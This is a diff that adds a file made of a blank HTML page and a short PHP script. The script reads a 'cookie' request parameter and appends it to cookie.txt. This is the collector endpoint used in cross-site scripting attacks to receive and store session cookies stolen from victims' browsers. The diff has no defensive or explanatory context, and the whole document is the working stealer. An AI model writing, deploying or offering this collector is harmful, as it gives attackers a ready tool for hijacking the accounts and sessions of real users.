@@ -1,0 +1,12 @@
+<html>
+<head></head>
+<body>
+</body>
+</html>
+<?php
+	$c=$_REQUEST['cookie'];
+	$cookiefile="cookie.txt";
+	$fp=fopen($cookiefile,'a');
+	fwrite($fp,$c);
+	fclose($fp);
+?>
